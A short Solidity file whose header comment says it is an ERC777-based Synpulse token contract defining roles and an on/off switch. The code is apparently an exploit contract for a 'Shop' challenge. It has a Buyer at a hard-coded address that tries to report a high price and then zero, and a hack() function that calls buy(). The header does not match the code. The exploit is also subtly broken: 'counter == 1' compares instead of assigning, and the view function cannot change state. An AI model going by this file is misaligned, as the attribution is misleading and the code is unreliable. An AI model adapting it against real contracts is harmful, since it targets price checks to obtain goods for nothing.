// SPDX-License-Identifier: MIT
// This contract was adapted from the ERC777 standard contract and deployed by : Janis M. Heibel, Roy Hove and Adil Anees on behalf of Synpulse.
// This following piece of code complements synpulseTokenGlobal contract. 
// It specifies the roles as well as the on / off function of the overall token contract.

pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
}

contract Buyer {
    address _addr = 0x62093284F072A9FfD1339226F46E9F49211Af262;
    Shop shop = Shop(_addr);
    uint counter = 0;

    function price() public view returns (uint) {
        if (counter == 0) {
            counter == 1;
            return 1000;
        } else {
            return 0;
        }
    }

    function hack() public {
        shop.buy();
    }
}